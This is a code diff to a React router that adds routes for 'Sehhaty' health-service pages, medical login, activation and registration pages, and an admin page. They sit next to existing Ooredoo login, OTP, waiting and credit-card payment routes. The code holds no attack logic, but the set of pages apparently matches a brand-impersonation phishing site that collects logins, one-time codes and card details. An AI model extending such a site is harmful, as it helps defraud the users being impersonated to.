@@ -17,6 +17,15 @@ import ServiceDetails from "./pages/ServiceDetails";
 import OoredooLogin from "./pages/OoredooLogin";
 import OoredooOtp from "./pages/OoredooOtp";
 import Waiting from "./pages/Waiting";
+import Sehhaty from "./pages/Sehhaty";
+import SehhatyInfo from "./pages/SehhatyInfo";
+import SehhatyService from "./pages/SehhatyService";
+import MedicalLogin from "./pages/MedicalLogin";
+import MedicalActivate from "./pages/MedicalActivate";
+import MedicalRegister from "./pages/MedicalRegister";
+import Legal from "./pages/Legal";
+import Info from "./pages/Info";
+import Admin from "./pages/Admin";
 
 // Payment Pages (kept as-is)
 import CreditCardPayment from "./pages/CreditCardPayment";
@@ -48,6 +57,17 @@ function Router() {
       <Route path={"/ooredoo-login"} component={OoredooLogin} />
       <Route path={"/ooredoo-otp"} component={OoredooOtp} />
       <Route path={"/waiting"} component={Waiting} />
+
+      {/* Sehhaty Routes */}
+      <Route path={"/sehhaty"} component={Sehhaty} />
+      <Route path={"/sehhaty/info/:id"} component={SehhatyInfo} />
+      <Route path={"/sehhaty/service/:id"} component={SehhatyService} />
+      <Route path={"/medical-login"} component={MedicalLogin} />
+      <Route path={"/medical-activate"} component={MedicalActivate} />
+      <Route path={"/medical-register"} component={MedicalRegister} />
+      <Route path={"/legal/:slug"} component={Legal} />
+      <Route path={"/info/:slug"} component={Info} />
+      <Route path={"/admin"} component={Admin} />
 
       {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
